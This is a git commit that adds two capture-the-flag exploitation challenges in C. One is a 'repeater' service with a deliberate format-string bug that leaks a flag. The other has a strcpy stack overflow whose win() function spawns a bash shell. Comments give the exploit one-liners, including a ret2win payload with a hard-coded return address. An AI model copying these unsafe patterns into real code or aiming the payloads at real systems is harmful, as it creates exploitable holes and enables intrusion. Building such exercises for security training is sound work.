7afe861a496055d595546ba068f029421c31c50e
John Toterhi <cetfor@protonmail.com>
2022-10-30 17:43:54 -0400

    Adding two new pwnables

---
+++ src/challenges/pwn/information_disclosure/id.c
@@ -0,0 +1,43 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+/*
+ * sudo gcc id.c -o id
+ * python3 -c "print('%lx.'*80)" | ./id
+ */
+
+int main(int argc, char** argv)
+{
+    char flag[64];
+    char inputString[128];
+
+    memset(&flag, 0, 64);
+    memset(&inputString, 0, 128);
+    
+    FILE *fp = fopen("flag.txt", "r");
+    if (fp != NULL) {
+        size_t newLen = fread(flag, sizeof(char), 63, fp);
+        if ( ferror( fp ) != 0 ) {
+            fputs("Error reading file. Please report this to the CTF organizers!\n", stderr);
+        } else {
+            flag[newLen++] = '\0';
+        }
+        fclose(fp);
+    }
+    
+    // prompt user
+    fputs("Welcome to the repeater service! I repeat whatever you type. I'm perfect for those that love to hear themselves talk!\n", stdout);
+    fputs("What would you like me to repeat? >> ", stdout);
+    fflush(stdout);
+
+    // get command remove newline chars
+    fgets(inputString, 128, stdin);
+    inputString[strcspn(inputString, "\r\n")] = 0;
+
+    // repeat the user
+    printf(inputString);
+
+    puts("\nThanks for listening to yourself!\n");
+    return EXIT_SUCCESS;
+}
---
+++ src/challenges/pwn/ret2win/ret2win.c
@@ -0,0 +1,53 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+/*
+ * Compile challenge with: gcc -O0 -fno-stack-protector -no-pie ret2win.c -o ret2win
+ * Get address of win() function with `readelf -a ret2win | grep win` (address: 0x401256)
+
+ * cat <(python3 -c "print('Pinchers of Peril' + 'A'*15 + 'B'*8 + '\x5b\x12\x40')") - | ./ret2win
+ 
+ * gcc -O0 -fno-stack-protector -no-pie ret2win.c -o ret2win
+
+ * Returning to the start of debugShell will cause a segfault because the stack will be misaligned
+ * This is triggered in do_system by the `movaps` instruction. To avoid the mis alignment, we return
+ * 2 instruction in, to avoid the 8-byte push of ebp to the stack, preventing the stack from becoming
+ * non-16-byte aligned.
+ * Thanks to these two sources for helping me understand the movaps segfault and stack alignment issue:
+ * http://blog.binpang.me/2019/07/12/stack-alignment/#reference
+ * https://pwndumb.github.io/posts/Docker-CTF-LiverOverflow-Challenge/
+ */
+
+void win() {
+    system("/bin/bash");
+}
+
+void checkSecret(char* secret) {
+    char secretString[32];
+    strcpy(secretString, secret);
+    if (!strncmp(secretString, "Pinchers of Peril", strlen("Pinchers of Peril"))) {
+        puts("That's the secret!");
+    } else {
+        puts("That's not the secret.");
+        exit(-1);
+    }
+}
+
+int main(int argc, char** argv)
+{
+    char commandString[256];
+    memset(&commandString, 0, 256);
+
+    // prompt user
+    fputs("What's the secret? >> ", stdout);
+    fflush(stdout);
+
+    // get command remove newline chars
+    fgets(commandString, 256, stdin);
+    commandString[strcspn(commandString, "\r\n")] = 0;
+    checkSecret(commandString);
+
+    puts("Disconnected.");
+    return EXIT_SUCCESS;
+}
